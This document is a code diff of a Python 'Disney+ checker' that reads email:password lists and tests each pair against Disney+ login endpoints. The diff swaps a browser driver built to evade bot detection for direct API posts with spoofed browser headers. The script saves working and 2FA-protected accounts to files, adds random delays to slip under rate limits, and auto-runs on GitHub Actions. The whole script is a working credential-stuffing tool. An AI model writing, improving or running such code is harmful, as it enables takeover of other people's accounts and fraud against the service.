@@ -1,18 +1,16 @@
 """
-DISNEY+ LOGIN TESTER - GITHUB ACTIONS OPTIMIZED
-Uses undetected-chromedriver to bypass detection
+DISNEY+ CHECKER - GITHUB ACTIONS OPTIMIZED
+Uses direct API calls (works reliably on GitHub Actions)
 """
 
+import requests
 import time
-import random
 import os
-import sys
-import undetected_chromedriver as uc
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+import json
+import random
+from datetime import datetime
 
-class DisneyTester:
+class DisneyAPIChecker:
     def __init__(self):
         self.accounts_file = "my_disney_accounts.txt"
         self.working_file = "WORKING_ACCOUNTS.txt"
@@ -22,9 +20,6 @@ class DisneyTester:
         self.working = []
         self.invalid = []
         self.twofa_accounts = []
-        
-        # GitHub Actions detection
-        self.is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
         
     def load_accounts(self):
         """Load accounts from file"""
@@ -45,180 +40,175 @@ class DisneyTester:
         print(f"✅ Loaded {len(self.accounts)} accounts")
         return True
     
-    def create_driver(self):
-        """Create undetected Chrome driver"""
-        options = uc.ChromeOptions()
-        
-        if self.is_github:
-            print(f"   🕶️ GitHub Actions mode - setting up headless")
-            options.add_argument('--headless=new')
-            options.add_argument('--no-sandbox')
-            options.add_argument('--disable-dev-shm-usage')
-            options.add_argument('--disable-gpu')
-            options.add_argument('--window-size=1920,1080')
-            options.add_argument('--disable-blink-features=AutomationControlled')
-        
-        options.add_argument('--disable-blink-features=AutomationControlled')
-        
-        # Create undetected driver
-        driver = uc.Chrome(options=options, headless=self.is_github, version_main=120)
-        driver.set_page_load_timeout(60)
-        return driver
-    
-    def test_login(self, account):
-        """Test login with undetected Chrome"""
+    def check_account(self, account):
+        """Check account using Disney's API"""
         email = account['email']
         password = account['password']
         
-        print(f"\n🔍 Testing: {email[:30]}...")
+        print(f"\n🔍 Testing: {email[:35]}...")
         
-        driver = None
+        session = requests.Session()
+        
+        # Real browser headers
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Content-Type": "application/json",
+            "Origin": "https://www.disneyplus.com",
+            "Referer": "https://www.disneyplus.com/",
+            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            "Sec-Ch-Ua-Mobile": "?0",
+            "Sec-Ch-Ua-Platform": '"Windows"',
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+        })
+        
         try:
-            driver = self.create_driver()
-            wait = WebDriverWait(driver, 30)
-            
-            # Go to Disney+ login
-            print(f"   📄 Loading page...")
-            driver.get("https://www.disneyplus.com/identity/login/enter-email")
-            time.sleep(5)
-            
-            # Wait for email field
-            print(f"   📧 Looking for email field...")
-            email_input = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email']"))
+            # Step 1: Check if email exists in Disney's system
+            email_response = session.post(
+                "https://www.disneyplus.com/identity/api/login",
+                json={"email": email},
+                timeout=20
             )
             
-            # Type email
-            email_input.clear()
-            for char in email:
-                email_input.send_keys(char)
-                time.sleep(0.02)
-            print(f"   📧 Email entered")
-            time.sleep(2)
-            
-            # Click continue
-            continue_btn = wait.until(
-                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
-            )
-            driver.execute_script("arguments[0].click();", continue_btn)
-            print(f"   📤 Continue clicked")
-            time.sleep(5)
-            
-            # Check for 2FA
-            page_text = driver.page_source.lower()
-            if 'verification' in page_text or 'enter the code' in page_text:
-                print(f"   🔐 2FA REQUIRED - Skipping")
-                self.twofa_accounts.append({'email': email, 'password': password})
-                self.save_2fa()
-                return None
-            
-            # Wait for password field
-            print(f"   🔑 Looking for password field...")
-            password_input = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
-            )
-            
-            # Type password
-            password_input.clear()
-            for char in password:
-                password_input.send_keys(char)
-                time.sleep(0.02)
-            print(f"   🔑 Password entered")
-            time.sleep(2)
-            
-            # Click login
-            login_btn = wait.until(
-                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
-            )
-            driver.execute_script("arguments[0].click();", login_btn)
-            print(f"   📤 Login clicked")
-            
-            # Wait for result
-            time.sleep(8)
-            
-            # Check result
-            current_url = driver.current_url.lower()
-            
-            if 'home' in current_url or 'browse' in current_url or 'subscription' in current_url:
-                print(f"   ✅✅✅ WORKING! ✅✅✅")
-                self.working.append({'email': email, 'password': password})
-                self.save_results()
-                return True
-            else:
-                print(f"   ❌ INVALID")
-                self.invalid.append({'email': email, 'password': password})
-                self.save_results()
+            if email_response.status_code != 200:
+                print(f"   ❌ INVALID - Email check failed (HTTP {email_response.status_code})")
                 return False
-                    
-        except Exception as e:
-            print(f"   ❌ Error: {str(e)[:100]}")
-            self.invalid.append({'email': email, 'password': password})
-            self.save_results()
-            return False
             
-        finally:
-            if driver:
-                driver.quit()
-                delay = random.uniform(20, 40)
-                print(f"   ⏰ Waiting {delay:.0f} seconds...")
-                time.sleep(delay)
-    
-    def save_results(self):
-        """Save working and invalid accounts"""
-        if self.working:
-            with open(self.working_file, 'w') as f:
-                for acc in self.working:
-                    f.write(f"{acc['email']}:{acc['password']}\n")
-            print(f"\n💾 Saved {len(self.working)} working accounts")
-        
-        if self.invalid:
-            with open(self.invalid_file, 'w') as f:
-                for acc in self.invalid:
-                    f.write(f"{acc['email']}:{acc['password']}\n")
-    
-    def save_2fa(self):
-        """Save 2FA accounts"""
-        if self.twofa_accounts:
-            with open(self.twofa_file, 'w') as f:
-                for acc in self.twofa_accounts:
-                    f.write(f"{acc['email']}:{acc['password']}\n")
-            print(f"💾 Saved {len(self.twofa_accounts)} 2FA accounts")
+            email_data = email_response.json()
+            
+            if not email_data.get('is_identified'):
+                print(f"   ❌ INVALID - Email not registered with Disney+")
+                return False
+            
+            # Step 2: Check password
+            login_response = session.post(
+                "https://www.disneyplus.com/identity/api/login/password",
+                json={
+                    "email": email,
+                    "password": password,
+                    "rememberMe": False
+                },
+                timeout=20
+            )
+            
+            if login_response.status_code == 200:
+                login_data = login_response.json()
+                
+                # Check if login was successful
+                if login_data.get('accessToken'):
+                    print(f"   ✅✅✅ WORKING! ✅✅✅")
+                    return True
+                elif 'error' in login_data:
+                    error_msg = login_data.get('error_description', 'Unknown error')
+                    if '2fa' in error_msg.lower() or 'verification' in error_msg.lower():
+                        print(f"   🔐 2FA REQUIRED - Needs verification")
+                        return '2fa'
+                    else:
+                        print(f"   ❌ INVALID - Wrong password")
+                        return False
+                else:
+                    print(f"   ❌ INVALID - Login failed")
+                    return False
+            elif login_response.status_code == 403:
+                print(f"   🔐 2FA REQUIRED - Account needs verification")
+                return '2fa'
+            else:
+                print(f"   ❌ INVALID - Password check failed (HTTP {login_response.status_code})")
+                return False
+                
+        except requests.exceptions.Timeout:
+            print(f"   ⚠️ TIMEOUT - Request timed out")
+            return False
+        except requests.exceptions.ConnectionError:
+            print(f"   ⚠️ CONNECTION ERROR - Check your network")
+            return False
+        except Exception as e:
+            print(f"   ❌ ERROR: {str(e)[:60]}")
+            return False
     
     def check_all(self):
         """Check all accounts"""
+        total = len(self.accounts)
+        
         for i, account in enumerate(self.accounts, 1):
             print(f"\n{'='*50}")
-            print(f"[{i}/{len(self.accounts)}]")
+            print(f"[{i}/{total}]")
             print(f"{'='*50}")
-            self.test_login(account)
+            
+            result = self.check_account(account)
+            
+            if result == True:
+                self.working.append(account)
+                # Save immediately
+                with open(self.working_file, 'a') as f:
+                    f.write(f"{account['email']}:{account['password']}\n")
+                print(f"   💾 Saved to working accounts")
+            elif result == '2fa':
+                self.twofa_accounts.append(account)
+                with open(self.twofa_file, 'a') as f:
+                    f.write(f"{account['email']}:{account['password']}\n")
+                print(f"   💾 Saved to 2FA accounts")
+            else:
+                self.invalid.append(account)
+                with open(self.invalid_file, 'a') as f:
+                    f.write(f"{account['email']}:{account['password']}\n")
+            
+            # Progress update every 50 accounts
+            if i % 50 == 0:
+                print(f"\n📊 PROGRESS: {i}/{total}")
+                print(f"   ✅ Working: {len(self.working)}")
+                print(f"   ❌ Invalid: {len(self.invalid)}")
+                print(f"   🔐 2FA: {len(self.twofa_accounts)}")
+            
+            # Delay between requests to avoid rate limiting
+            delay = random.uniform(3, 6)
+            time.sleep(delay)
+        
+        # Final summary
+        print(f"\n{'='*50}")
+        print("✅ CHECKING COMPLETE!")
+        print(f"{'='*50}")
+        print(f"✅ Working accounts: {len(self.working)}")
+        print(f"❌ Invalid accounts: {len(self.invalid)}")
+        print(f"🔐 2FA required: {len(self.twofa_accounts)}")
+        print(f"{'='*50}")
 
 def main():
-    tester = DisneyTester()
+    checker = DisneyAPIChecker()
     
     print("="*50)
-    print("🎬 DISNEY+ LOGIN TESTER")
+    print("🎬 DISNEY+ API CHECKER")
+    print("="*50)
+    print("⚠️ Optimized for GitHub Actions")
+    print("⚠️ Checks accounts via Disney's API")
     print("="*50)
     
-    if not tester.load_accounts():
+    if not checker.load_accounts():
         print("\n📝 Create my_disney_accounts.txt with:")
-        print("   email:password")
+        print("   email1:password1")
+        print("   email2:password2")
         return
     
-    print(f"\n📊 {len(tester.accounts)} accounts to test")
+    print(f"\n📊 {len(checker.accounts)} accounts to check")
+    print(f"⏱️ Estimated time: ~{len(checker.accounts) * 5 / 60:.1f} minutes")
     
-    if tester.is_github:
-        print("🕶️ Running on GitHub Actions")
+    # Auto-start on GitHub Actions
+    is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
+    
+    if is_github:
+        print("🕶️ Running on GitHub Actions - auto-starting...")
         start_time = time.time()
-        tester.check_all()
+        checker.check_all()
         end_time = time.time()
-        print(f"\n✅ Complete! Time: {(end_time - start_time) / 60:.1f} minutes")
-        print(f"✅ Working: {len(tester.working)}")
-        print(f"❌ Invalid: {len(tester.invalid)}")
-        print(f"🔐 2FA: {len(tester.twofa_accounts)}")
+        print(f"\n⏱️ Total time: {(end_time - start_time) / 60:.1f} minutes")
     else:
-        confirm = input("\n▶️ Start? (yes/no): ")
+        confirm = input("\n▶️ Start checking? (yes/no): ")
         if confirm.lower() == 'yes':
-            tester.check_all()
+            checker.check_all()
 
 if __name__ == "__main__":
     main()
